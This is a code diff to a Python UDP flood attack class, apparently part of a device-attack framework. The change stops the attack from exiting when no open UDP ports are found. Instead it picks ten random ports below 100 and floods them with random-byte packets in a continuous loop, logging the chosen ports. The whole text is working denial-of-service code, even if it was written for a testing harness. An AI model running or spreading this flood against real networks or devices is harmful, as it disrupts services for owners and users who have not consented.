@@ -3,6 +3,7 @@ import logging
 log = logging.getLogger(__name__)
 from scapy.all import *
 import threading
+import random
 
 class UdpFlood(GenericAttack):
 
@@ -16,12 +17,21 @@ class UdpFlood(GenericAttack):
         continuousAttack = self.config['continuous_attack']
 
         if self.device["vulnerable_ports"] is None:
-            result.update({"status": "no open ports"})
-            return
+            # result.update({"status": "no open ports"})
+            # return
+            openPorts = random.sample(xrange(100), 10)
+            portResult={}
+            portResult.update({"open":openPorts})
+            udpPorts = {"udp":portResult}
+            self.device.update({"vulnerable_ports": udpPorts})
 
         if "udp" not in self.device["vulnerable_ports"].keys():
-            result.update({"status": "no open ports"})
-            return
+            # result.update({"status": "no open ports"})
+            # return
+            openPorts = random.sample(xrange(100), 10)
+            portResult = {}
+            portResult.update({"open": openPorts})
+            self.device["vulnerable_ports"].update({"udp": portResult})
 
         if "open" not in self.device["vulnerable_ports"]["udp"].keys():
             result.update({"status": "no open ports"})
@@ -39,8 +49,11 @@ class UdpFlood(GenericAttack):
         bytes = random._urandom(self.config['packet_size_in_bytes'])
         start_time = time.time()
         packetCount = 0
+        log.info(self.device["vulnerable_ports"]["udp"]["open"])
         while self.running:
             for port in self.device["vulnerable_ports"]["udp"]["open"]:
+                if port == 0:
+                    continue
                 sock.sendto(bytes, (target, port))
                 packetCount += 1
 
